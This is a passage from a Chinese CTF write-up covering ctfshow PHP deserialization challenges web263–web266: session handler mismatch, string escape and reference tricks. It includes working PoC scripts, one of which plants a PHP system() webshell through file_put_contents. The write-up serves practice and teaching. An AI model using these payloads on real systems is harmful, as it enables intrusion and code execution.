src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616381988320-1f8a26c1-e7d1-4663-ac44-a9bb8bde1e46.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616381988320-1f8a26c1-e7d1-4663-ac44-a9bb8bde1e46.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616382023862-12770f9f-2334-4320-a93d-f4ec589a573d.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616382023862-12770f9f-2334-4320-a93d-f4ec589a573d.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web263-session伪造"><a href="#web263-session伪造" class="headerlink" title="web263 session伪造"></a>web263 session伪造</h2><span class='btn'><a class="button"  title='PHP/7.3.11'><i class='fas fa-tag'></i>PHP/7.3.11</a></span> <span class='btn'><a class="button"  title='session伪造'><i class='fas fa-tag'></i>session伪造</a></span><p><a href="https://www.yuque.com/attachments/yuque/0/2021/zip/2789727/1616392581642-23859f77-d323-4bdf-b5cc-862753f23d09.zip">📎www.zip</a></p><p>通过 <code>/www.zip</code> 扫描到源码，这里目录扫描全是 200，建议使用可以看到返回包大小的扫描器，或者有 404 页面识别的扫描器，比如 dirmap</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616383532005-925e83c0-512b-4390-85c4-8387ca46d9a9.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616383532005-925e83c0-512b-4390-85c4-8387ca46d9a9.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>日常吐槽 fortify，咋啥也扫不出来 (x</p><p>seay 发现 file_put_contents 输入可控</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616383372458-c7207443-0771-4791-8c9e-8af0572edff8.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616383372458-c7207443-0771-4791-8c9e-8af0572edff8.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>利用前提：</p><p>利用点是 <code>session.serialize_handler</code> 与 php.ini 的配置不同引起的反序列化，至于为什么不同，如果相同的也就没必要加上这句设置了（<code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code>），毕竟是默认配置对吧</p><p>目标：</p><ul><li><code>file_put_contents</code> 可控点在 <code>inc/inc.php</code> 在 <code>User</code> 类，可以通过反序列化触发 <code>__destruct</code></li></ul><p>思路：</p><ul><li>首先访问两次首页，抓包可以看到<code>Cookie</code> <code>limit</code> 参数，构造 exp ，使得我们的反序列化数据写入 session 文件（通过 <code>$_SESSION[&#39;limit&#39;]=base64_decode($_COOKIE[&#39;limit&#39;]);</code> 写入，这是PHP session 机制，可参考 <a href="https://xz.aliyun.com/t/6640">此链接</a>）</li><li>因 <code>inc/inc.php</code>  存在  <code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code> 和 <code>session_start();</code> ，只要访问即会获取之前写入的 <code>session</code> 数据，然后 <code>check.php</code> 包含 <code>inc/inc.php</code> ，即会触发 <code>User类</code> 的 <code>__destruct方法</code> ，从而把恶意数据通过 <code>file_put_contents</code> 写入名为 <code>log-$this.username</code> ，内容为 <code>$this.password</code> 的文件。</li></ul><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;tari.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;&lt;?php system(&quot;cat flag.php&quot;) ?&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> User();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(base64_encode(<span class="string">&#x27;|&#x27;</span>.serialize(<span class="variable">$user</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里加 <code>&#39;|&#39;</code> 是因为 <code>session.serialize_handler</code> 使用 <code>php引擎</code> ，session 关联数组的 <code>key</code> 和 <code>value</code> 是通过 <code>&#39;|&#39;</code> 区分的， <code>value</code> 是需要被反序列化的部分。然后默认不是用 php 引擎，所以…. 所以写入是正常字符串，在 <code>inc/inc.php</code> 这读取语义又不一样了。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617611777418-faa713aa-f4e2-41a4-ae7b-cb80b0738090.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617611777418-faa713aa-f4e2-41a4-ae7b-cb80b0738090.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>随便请求一下 check.php</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617611797635-345ee197-41a2-4255-9462-dcb895a00449.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617611797635-345ee197-41a2-4255-9462-dcb895a00449.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>注意是 <code>log-tari.php</code> !</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617611816637-8f34127a-223a-4c94-9f86-c1a9a0a88cee.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617611816637-8f34127a-223a-4c94-9f86-c1a9a0a88cee.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web264-字符逃逸"><a href="#web264-字符逃逸" class="headerlink" title="web264 字符逃逸"></a>web264 字符逃逸</h2><span class='btn'><a class="button"  title='PHP/5.6.40'><i class='fas fa-tag'></i>PHP/5.6.40</a></span> <span class='btn'><a class="button"  title='字符逃逸'><i class='fas fa-tag'></i>字符逃逸</a></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-03 02:37:19</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 16:05:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@message</span>.php</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> message(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = str_replace(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, serialize(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]=base64_encode(<span class="variable">$umsg</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>看注释发现 message.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-03 15:13:03</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 15:17:17</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">session_start();</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = unserialize(base64_decode(<span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看注释发现 message.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-03 15:13:03</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 15:17:17</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">session_start();</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = unserialize(base64_decode(<span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一开始没看出和 web262 有啥区别，仔细看了一下发现，反序列化时使用了 session 而不是直接通过 Cookie 接收</p><p>做法和 web262中第二种做法一样，虽然不是通过 Cookie 接收，也别忘了了 Cookie 的 msg 字段附加个值，不然不满足</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br></pre></td></tr></table></figure><p>先请求 <code>index.php</code> （这里 poc 不明白怎么构造看一下 web262 第二种做法）</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617612288933-93722641-a0ee-4b58-87d0-346f427957cf.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617612288933-93722641-a0ee-4b58-87d0-346f427957cf.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>因为 PHP 的 <code>session</code> 是通过 Cookie 里的 <code>PHPSESSID</code> 获取的（不清除参考 web263 session 伪造），所以要记录下来，然后在 <code>message.php</code> 里带上。</p><p>然后请求一下 <code>message.php</code> , 别忘了 <code>Cookie</code> 部分</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617612374091-4ef0cf55-ca51-4973-b405-49ccef2fdefa.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617612374091-4ef0cf55-ca51-4973-b405-49ccef2fdefa.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web265-变量引用"><a href="#web265-变量引用" class="headerlink" title="web265 变量引用"></a>web265 变量引用</h2><span class='btn'><a class="button"  title='PHP/5.6.40'><i class='fas fa-tag'></i>PHP/5.6.40</a></span> <span class='btn'><a class="button"  title='变量引用'><i class='fas fa-tag'></i>变量引用</a></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-04 23:52:24</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-05 00:17:08</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=<span class="variable">$t</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;token===<span class="keyword">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"><span class="variable">$ctfshow</span>-&gt;token=md5(mt_rand());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>-&gt;login())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>token 会变，让 password 成为 token 的引用就好了</p><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$admin</span> = <span class="keyword">new</span> ctfshowAdmin();</span><br><span class="line"><span class="variable">$admin</span>-&gt;password = &amp;<span class="variable">$admin</span>-&gt;token;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(urlencode(serialize(<span class="variable">$admin</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616399516360-f6f77f35-27ec-4eff-95e1-27eefaf58af8.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616399516360-f6f77f35-27ec-4eff-95e1-27eefaf58af8.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web266-类和方法不区分大小写"><a href="#web266-类和方法不区分大小写" class="headerlink" title="web266 类和方法不区分大小写"></a>web266 类和方法不区分大小写</h2><span class='btn'><a class="button"  title='PHP/7.3.11'><i class='fas fa-tag'></i>PHP/7.3.11</a></span> <span class='btn'><a class="button"  title='PHP特性'><i class='fas fa-tag'></i>PHP特性</a></span> <span class='btn'><a class="button"  title='类和方法不区分大小写'><i class='fas fa-tag'></i>类和方法不区分大小写</a></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 